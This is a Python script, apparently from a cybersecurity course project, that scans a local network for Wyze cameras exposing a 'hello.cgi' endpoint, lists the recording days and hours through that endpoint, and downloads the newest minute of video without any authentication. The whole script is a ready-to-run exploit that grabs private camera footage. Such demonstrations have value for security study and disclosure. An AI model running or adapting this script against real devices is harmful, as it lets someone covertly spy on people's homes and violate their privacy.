#!/usr/bin/env python3
import nmap
import requests
from bs4 import BeautifulSoup
from lxml import html
import wget
import argparse
from colorama import init
from termcolor import cprint 
from pyfiglet import figlet_format
import time


def ip_scanner(ip_mask):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_mask, arguments='-T4 -p 80')
    return nm.all_hosts()

def find_hello_cgi(ip):
    try:
        r = requests.get('http://' + ip + '/cgi-bin/hello.cgi', timeout=0.5)
    except:
        return False
    return r.status_code == 200 and 'CGI Output' in r.text

def list_days(ip):
    r = requests.get('http://' + ip + '/cgi-bin/hello.cgi?name=record')
    soup = BeautifulSoup(r.text, 'html.parser')
    days = soup.find_all('h2')
    return [x.get_text() for x in days]

def list_hours(day, ip):
    r = requests.get('http://'+ ip + '/cgi-bin/hello.cgi?name=record/'+day)
    soup = BeautifulSoup(r.text, 'html.parser')
    hours = soup.find_all('h2')
    return [x.get_text() for x in hours]

def list_videos(day, hour, ip):
    r = requests.get('http://' + ip + '/cgi-bin/hello.cgi?name=record/'+day+'/'+hour)
    soup = BeautifulSoup(r.text, 'html.parser')
    videos = soup.find_all('h1')
    return [x.get_text() for x in videos]

def get_video(day, hour, vid, ip):

    print("\ndownloading most recent minute of recording...\n")
    r = wget.download('http://' + ip + '/SDPath/record/'+day+'/'+hour+'/'+vid)
    print("\nname of file: ", r)

if __name__ == "__main__":


    ########## visual stuff ################
    str_ec521 = figlet_format('       EC521',font='banner',width=100)
    for i in str_ec521:
        cprint (i,'red',attrs=['bold'],end='')
        time.sleep(0.015)
    
    str_cybersec = figlet_format('Cybersecurity',font='banner',width=100)
    for i in str_cybersec:
        cprint (i,'red',attrs=['bold'],end='')
        time.sleep(0.01)
    ########################################


    parser = argparse.ArgumentParser(description='Find a Wyze camera on the network and download a minute of video from it.')
    parser.add_argument('--ipmask', type=str,
            default='192.168.0.0/24',
            help='IPs to search. Can be a single address like 192.168.0.201, or a masked address like 192.168.0.0/16. Default: 192.168.0.0/24')
    args = parser.parse_args()

    print('Searching for a wyze camera on', args.ipmask)
    hosts = ip_scanner(args.ipmask)
    camera = ''
    for host in hosts:
        try:
            if find_hello_cgi(host):
                print ('Wyze Camera has IP: ' + host)
                camera = host
                break
        except:
                pass
    if camera == '':
        print('camera not found')
    else:
        days = list_days(camera)

        hours = list_hours(days[-1], camera)

        videos = []
        for hour in hours:
            videos.append((hour,list_videos(days[-1], hour, camera)))

        get_video(days[-1],videos[-1][0], videos[-1][1][-2], camera)
